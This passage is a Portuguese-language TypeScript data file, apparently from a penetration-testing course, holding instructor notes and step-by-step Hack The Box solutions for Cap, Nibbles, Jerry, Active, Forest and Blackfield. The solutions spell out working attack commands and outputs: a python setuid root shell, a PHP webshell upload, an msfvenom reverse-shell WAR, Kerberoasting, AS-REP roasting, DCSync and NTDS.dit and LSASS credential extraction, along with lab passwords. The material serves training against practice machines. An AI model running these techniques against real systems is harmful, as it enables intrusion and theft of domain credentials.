          { ask: 'Qual evidência mínima sustenta process injection?', expected: 'Combinação de processo suspeito, memória anômala como RWX/MZ via malfind, comportamento de rede ou DLL/cmdline incoerente.' },
          { ask: 'Qual é o pré-requisito real de DCSync?', expected: 'Permissões de replicação no domínio, como Replicating Directory Changes; não basta ter qualquer usuário autenticado.' },
        ]
      },
      {
        title: 'Bloco Matutino (3h): Memória + Malware',
        duration: '3 horas',
        content: [
          'Execute Volatility pslist em dump demo — projete o output. Pergunte: "Esta árvore de processos parece normal?"',
          'Mostre processo oco (hollowed): svchost sem pai visível rodando de caminho incomum.',
          'malfind demo: mostre saída com região RWX e header MZ. Explique por que MZ em memória de dados é anomalia.',
          'Análise de strings: rode strings em binário de malware de amostra. Turma identifica IOCs.',
          'Base64 em string: "o que esse texto Base64 revela?" — decodifique ao vivo.',
        ],
        questions: [
          { ask: 'Qual plugin Volatility detecta código injetado?', expected: 'windows.malfind — procura regiões de memória com permissão RWX e assinatura PE (MZ header).' },
          { ask: 'Por que uma string Base64 em memória de processo é suspeita?', expected: 'Malware frequentemente usa Base64 para codificar payloads, C2 URLs ou configurações para evitar detecção por strings simples.' },
        ]
      },
      {
        title: 'Bloco Vespertino (3h): AD Avançado + Privesc',
        duration: '3 horas',
        content: [
          'BloodHound: mostre shortest paths to DA para o cenário da Blackfield.',
          'Explique SeBackupPrivilege → extração de NTDS.dit via diskshadow + robocopy.',
          'Privesc Windows: mostre SeImpersonatePrivilege → PrintSpoofer em demo.',
          'Privesc Linux: revise a Cap: python3 capability como exemplo concreto. Mostre linPEAS depois do getcap manual e peça que a turma compare o achado automatizado com a evidência nativa.',
        ],
        questions: [
          { ask: 'Como extrair NTDS.dit de um DC sem copiá-lo diretamente?', expected: 'Usar diskshadow para criar volume shadow copy do disco, depois robocopy para extrair ntds.dit e SYSTEM hive da shadow copy.' },
          { ask: 'O que é DCSync?', expected: 'Técnica que simula um Domain Controller fazendo replicação — extrai todos os hashes do domínio do DC real sem precisar de acesso físico.' },
        ]
      },
      {
        title: 'Bloco Noturno (6h): Labs Hard',
        duration: '6 horas',
        content: [
          'Blackfield: avise que NTDS extraction é a parte mais trabalhosa — dê contexto de diskshadow antes de começar.',
          'Sizzle: explique SCF attack conceitualmente (arquivo que força autenticação Windows) antes do lab.',
          'Para máquinas Insane: apresente como aspiracional, não expectativa. O processo importa mais que chegar ao fim.',
          'Debrief final: mostre resolução completa de pelo menos uma máquina hard para consolidar aprendizado.',
        ]
      }
    ]
  },
  {
    day: 4,
    title: 'Dia 4 — Revisão Final e Simulados',
    objective: 'Consolidar todo o conteúdo, simular condições de prova real e garantir que alunos sabem documentar achados corretamente.',
    blocks: [
      {
        title: 'Roteiro obrigatório (10h30): Simulado e correção de lacunas',
        duration: '10h30 de estudo líquido',
        content: [
          'O Dia 4 deve ser ativo. Evite palestra longa: use perguntas, flashcards, simulado, escrita de relatório e debrief.',
          'Comece com revisão oral de comandos: para cada comando, o aluno diz quando usar, qual saída espera e qual erro comum evitar.',
          'No simulado Blue Team, forneça logs/PCAP e cobre timeline. No simulado Red Team, cobre enumeração e hipóteses mesmo que não haja exploração completa.',
          'Use a rubrica de relatório: cada afirmação precisa de timestamp, fonte, evidência e impacto. Corte frases vagas na hora.',
          'Nos speed runs, o objetivo não é só flag. Meça qualidade de método: scan salvo, enumeração completa, notas e pivôs justificados.',
          'Fechamento obrigatório: plano individual com três lacunas técnicas, três comandos para treinar e dois labs para refazer.',
        ],
        questions: [
          { ask: 'Qual é a diferença entre comando útil e comando decorado?', expected: 'Comando útil responde uma pergunta e gera decisão; comando decorado é executado sem hipótese nem interpretação.' },
          { ask: 'O que torna uma evidência forte em relatório?', expected: 'Ela tem fonte, timestamp, contexto, reproduzibilidade e sustenta diretamente a afirmação.' },
          { ask: 'Quando abandonar uma hipótese no simulado?', expected: 'Quando após um bloco de tempo definido ela não produz evidência nova; então registra-se o que foi tentado e muda-se a pergunta.' },
        ]
      },
      {
        title: 'Manhã (2h): Revisão e Erros Fatais',
        duration: '2 horas',
        content: [
          'Revise a lista de erros fatais — cada aluno conta um erro cometido no curso.',
          'Mostre o cheat sheet e confirme que todos têm cópia.',
          'Exercício: dado um PCAP de 5 minutos, alunos respondem o checklist de incidente.',
          'Revisão de MITRE: mostre 5 evidências, alunos mapeiam para técnica.',
        ]
      },
      {
        title: 'Tarde (2h): Escrita de Relatório',
        duration: '2 horas',
        content: [
          'Cada aluno escreve sumário executivo de uma máquina que resolveu.',
          'Revisão em pares: o parceiro verifica se todas as afirmações têm evidência.',
          'Discussão final: "Qual foi a técnica mais difícil da semana? Por quê?"',
        ]
      },
      {
        title: 'Noite (8h): Speed Runs Cronometrados',
        duration: '8 horas',
        content: [
          'Regras de prova real: sem dicas após timer iniciar, documentação obrigatória.',
          'Objetivo não é completar tudo — é ser sistemático e documentar bem o que tentar.',
          'Após cada lab: 10 minutos de debrief coletivo.',
        ]
      }
    ]
  }
];

export const teacherNotes: TeacherNote[] = baseTeacherNotes.map((note) => ({
  ...note,
  blocks: [
    ...(teacherTenHourBlocksByDay[note.day] || []),
    ...(teacherScriptBlocksByDay[note.day] || []),
    ...note.blocks,
  ],
}));

export const labSolutions: LabSolution[] = [
  {
    labId: 'cap',
    name: 'Cap — Resolução Didática',
    steps: [
      {
        objective: 'Enumeração inicial',
        command: 'nmap -sC -sV -oN scan.txt 10.10.10.245',
        explanation: 'Scan padrão de CTF: scripts padrão (-sC), versão de serviço (-sV), salvar output (-oN).',
        output: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1\n80/tcp open  http    gunicorn',
        errors: 'Se o host parece offline: adicionar -Pn',
        confirmation: 'Portas 22 (SSH) e 80 (HTTP) abertas. Aplicação web rodando com gunicorn (Python/Flask).'
      },
      {
        objective: 'Exploração web — manipulação de URL',
        command: 'curl -s http://10.10.10.245/data/0',
        explanation: 'A aplicação web mostra capturas PCAP. O número no URL (/data/0) identifica qual captura. Tente outros valores.',
        output: 'Resposta JSON com informações do PCAP',
        confirmation: 'Altere para /data/1, /data/2 — você está vendo capturas de OUTROS usuários. Download da captura em /download/2.'
      },
      {
        objective: 'Análise do PCAP',
        command: 'Abrir no Wireshark, filtro: ftp',
        explanation: 'FTP transmite credenciais em texto claro. Filtrar "ftp" mostra comandos USER e PASS.',
        output: 'USER nathan\nPASS Buck3tH4TF0RM3!',
        confirmation: 'Credenciais: nathan / Buck3tH4TF0RM3!'
      },
      {
        objective: 'Acesso SSH com credenciais encontradas',
        command: 'ssh nathan@10.10.10.245',
        explanation: 'Usar as credenciais FTP encontradas para autenticar via SSH.',
        confirmation: 'Shell como nathan. Flag em /home/nathan/user.txt'
      },
      {
        objective: 'Enumeração de privilégios — capabilities',
        command: 'python3.8 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
        explanation: 'getcap -r / revela que python3.8 tem cap_setuid+ep. Essa capability permite que python3.8 chame setuid(0) sem ser root — equivalente a SUID para este propósito.',
        output: 'root@cap:/home/nathan#',
        confirmation: 'Shell como root. Flag em /root/root.txt'
      }
    ],
    mitre: ['T1040 — Network Sniffing', 'T1548.001 — Setuid and Setgid']
  },
  {
    labId: 'nibbles',
    name: 'Nibbles — Resolução Didática',
    steps: [
      {
        objective: 'Enumeração — código fonte',
        command: 'curl -s http://10.10.10.75 | grep -i nibble',
        explanation: 'O código-fonte da página inicial contém comentário HTML revelando /nibbleblog.',
        output: '<!-- /nibbleblog/ directory. Nothing interesting here! -->',
        confirmation: 'Caminho /nibbleblog descoberto sem força bruta.'
      },
      {
        objective: 'Identificar painel administrativo',
        command: 'gobuster dir -u http://10.10.10.75/nibbleblog/ -w common.txt',
        explanation: 'Enumeração do subdiretório revela /admin.php.',
        confirmation: 'Admin panel em /nibbleblog/admin.php'
      },
      {
        objective: 'Autenticação',
        command: 'Credenciais: admin / nibbles',
        explanation: 'Nome da máquina é uma dica. Senha é o nome do blog: nibbles.',
        errors: 'ATENÇÃO: após ~5 tentativas erradas o IP é bloqueado temporariamente. Não force bruta.',
        confirmation: 'Acesso ao painel Nibbleblog admin.'
      },
      {
        objective: 'Upload de webshell via plugin',
        command: 'Plugins → My Image → upload PHP webshell como image.php (bypass: Content-Type: image/jpeg)',
        explanation: 'Plugin My Image aceita upload mas não valida a extensão — apenas o Content-Type.',
        output: 'Shell em: /nibbleblog/content/private/plugins/my_image/image.php?cmd=id',
        confirmation: 'RCE como www-data. Escalone para shell reversa.'
      },
      {
        objective: 'Escalada de privilégio via sudo',
        command: 'sudo /home/nibbler/personal/stuff/monitor.sh',
        explanation: 'sudo -l revela NOPASSWD para /home/nibbler/personal/stuff/monitor.sh. O script não existe — crie com payload de shell reversa.',
        confirmation: 'Root shell. Flag em /root/root.txt'
      }
    ],
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1548.003 — Sudo and Sudo Caching']
  },
  {
    labId: 'jerry',
    name: 'Jerry — Resolução Didática',
    steps: [
      {
        objective: 'Identificar Tomcat Manager',
        command: 'nmap -sV -p 8080 10.10.10.95',
        explanation: 'Nmap revela Apache Tomcat na porta 8080. Manager em /manager/html.',
        confirmation: 'Tomcat 7.0.88 identificado.'
      },
      {
        objective: 'Credenciais padrão',
        command: 'tomcat / s3cret',
        explanation: 'Tomcat tem lista conhecida de credenciais padrão. tomcat:s3cret é uma das mais comuns.',
        errors: 'Se bloqueado (403), limpe cookies ou use IP diferente.',
        confirmation: 'Acesso ao Tomcat Manager /manager/html'
      },
      {
        objective: 'Gerar WAR malicioso',
        command: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f war -o shell.war',
        explanation: 'msfvenom cria arquivo WAR com JSP que executa shell reversa. O Tomcat Manager permite deploy de WARs.',
        confirmation: 'shell.war gerado. Inicie listener: nc -lvnp 4444'
      },
      {
        objective: 'Deploy e execução',
        command: 'Upload via Manager interface → acesse /shell/',
        explanation: 'Após deploy, navegar para a URL da aplicação ativa o JSP e conecta ao listener.',
        output: 'Shell como nt authority\\system',
        confirmation: 'SYSTEM shell. Flags em C:\\Users\\Administrator\\Desktop\\flags\\'
      }
    ],
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1059.007 — JavaScript/JScript (JSP)']
  },
  {
    labId: 'active',
    name: 'Active — Resolução Didática',
    steps: [
      {
        objective: 'Enumeração SMB anônima',
        command: 'smbclient -L //10.10.10.100 -N',
        explanation: 'Sessão nula SMB revela shares. O share Replication é acessível anonimamente.',
        confirmation: 'Share Replication disponível sem autenticação.'
      },
      {
        objective: 'Encontrar Groups.xml',
        command: 'smbclient //10.10.10.100/Replication -N\n# Baixe recursivamente: prompt OFF; recurse ON; mget *',
        explanation: 'Navegar em Policies/{GUID}/MACHINE/Preferences/Groups/ para encontrar Groups.xml.',
        output: 'Groups.xml com campo cpassword',
        confirmation: 'Arquivo encontrado com cpassword da conta SVC_TGS.'
      },
      {
        objective: 'Descriptografar GPP password',
        command: 'gpp-decrypt AQAAANCMnd8BFdERjHoAwE...',
        explanation: 'Microsoft publicou a chave AES usada para criptografar cpassword em GPP. gpp-decrypt usa essa chave para reverter.',
        output: 'GPPstillStandingStrong2k18',
        confirmation: 'Credenciais: SVC_TGS / GPPstillStandingStrong2k18'
      },
      {
        objective: 'Kerberoasting',
        command: 'GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile kerb.txt',
        explanation: 'Com credenciais válidas, solicitar tickets de serviço para contas com SPN. Administrator tem SPN.',
        confirmation: 'Hash Kerberoast do Administrator obtido.'
      },
      {
        objective: 'Crack e acesso total',
        command: 'hashcat -m 13100 kerb.txt rockyou.txt\npsexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100',
        explanation: 'hashcat quebra o TGS offline. psexec usa credenciais para shell SYSTEM.',
        output: 'C:\\Windows\\system32>',
        confirmation: 'SYSTEM shell. user.txt em C:\\Users\\SVC_TGS\\Desktop\\, root.txt em C:\\Users\\Administrator\\Desktop\\'
      }
    ],
    mitre: ['T1552.006 — Group Policy Preferences', 'T1558.003 — Kerberoasting']
  },
  {
    labId: 'forest',
    name: 'Forest — Resolução Didática',
    steps: [
      {
        objective: 'Enumerar usuários via RPC sem credenciais',
        command: 'rpcclient -U "" -N 10.10.10.161\n> enumdomusers',
        explanation: 'rpcclient com sessão nula enumera usuários do domínio em DCs mal configurados. Salve a lista de usernames.',
        confirmation: 'Lista de usuários incluindo svc-alfresco e outros.'
      },
      {
        objective: 'AS-REP Roasting',
        command: 'GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -outputfile asrep.txt',
        explanation: 'Verifica cada usuário da lista. svc-alfresco não requer pré-autenticação Kerberos — hash obtido.',
        confirmation: 'Hash AS-REP do svc-alfresco.'
      },
      {
        objective: 'Crack do hash',
        command: 'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt',
        explanation: 'Hashcat -m 18200 = Kerberos AS-REP etype 23.',
        output: 's3rvice',
        confirmation: 'Credenciais: svc-alfresco / s3rvice'
      },
      {
        objective: 'Mapear AD com BloodHound',
        command: 'bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -ns 10.10.10.161 -c All',
        explanation: 'Coleta relações do AD. svc-alfresco → Account Operators → pode adicionar usuários a Exchange groups → WriteDACL no domínio → DCSync.',
        confirmation: 'Caminho de ataque identificado no BloodHound.'
      },
      {
        objective: 'DCSync para obter hash do Administrator',
        command: 'net group "Exchange Windows Permissions" svc-alfresco /add /domain\nsecretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161',
        explanation: 'Adicionando svc-alfresco ao grupo Exchange Windows Permissions, ele ganha WriteDACL no domínio. DCSync extrai todos os hashes.',
        output: 'Administrator:500:HASH:HASH:::',
        confirmation: 'Pass-the-hash com Administrator para root.txt em C:\\Users\\Administrator\\Desktop\\'
      }
    ],
    mitre: ['T1558.004 — AS-REP Roasting', 'T1484.001 — Domain Policy Modification: Group Policy Modification', 'T1003.006 — DCSync']
  },
  {
    labId: 'blackfield',
    name: 'Blackfield — Resolução Didática',
    steps: [
      {
        objective: 'Enumerar usernames via SMB',
        command: 'smbclient //10.10.10.192/profiles$ -N\n# ls → lista de diretórios = usernames',
        explanation: 'Share profiles$ acessível anonimamente. Cada diretório tem o nome de um usuário do domínio.',
        confirmation: 'Lista de ~314 usernames extraída dos diretórios.'
      },
      {
        objective: 'AS-REP Roasting',
        command: 'GetNPUsers.py blackfield.local/ -usersfile users.txt -no-pass',
        explanation: 'Testar cada username. Usuário "support" não requer pré-autenticação.',
        confirmation: 'Hash AS-REP do support obtido.'
      },
      {
        objective: 'Crack e enumeração BloodHound',
        command: 'hashcat -m 18200 hash.txt rockyou.txt\n# Resultado: #00^BlackKnight',
        explanation: 'Com credenciais do support, rodar BloodHound. support tem ForceChangePassword sobre audit2020.',
        confirmation: 'Caminho: support → ForceChangePassword → audit2020'
      },
      {
        objective: 'Alterar senha do audit2020',
        command: 'net rpc password audit2020 "NovaS3nha!" /user:support%"#00^BlackKnight" /S 10.10.10.192',
        explanation: 'Com ForceChangePassword, alteramos a senha do audit2020 sem conhecer a atual.',
        confirmation: 'Acesso ao audit2020. SMB → share forensic → lsass.zip'
      },
      {
        objective: 'Extrair credenciais do LSASS dump',
        command: 'pypykatz lsa minidump lsass.DMP',
        explanation: 'lsass.zip contém dump de memória do processo LSASS. pypykatz extrai hashes NTLM.',
        output: 'svc_backup:HASH',
        confirmation: 'Hash NTLM do svc_backup.'
      },
      {
        objective: 'Extrair NTDS.dit via SeBackupPrivilege',
        command: 'diskshadow /s shadow.txt\nrobocopy /b \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ . ntds.dit',
        explanation: 'svc_backup tem SeBackupPrivilege. Usar diskshadow para criar shadow copy e robocopy com /b (backup) para extrair ntds.dit e SYSTEM hive.',
        confirmation: 'ntds.dit + SYSTEM hive extraídos.'
      },
      {
        objective: 'Dump de todos os hashes',
        command: 'secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL',
        explanation: 'secretsdump.py processa o ntds.dit offline e extrai todos os hashes do domínio.',
        output: 'Administrator:500:HASH:NTLMHASH:::',
        confirmation: 'Pass-the-hash para Administrator. root.txt em C:\\Users\\Administrator\\Desktop\\'
      }
    ],
    mitre: ['T1558.004 — AS-REP Roasting', 'T1555 — Credentials from Password Stores', 'T1003.003 — NTDS']
  }
];
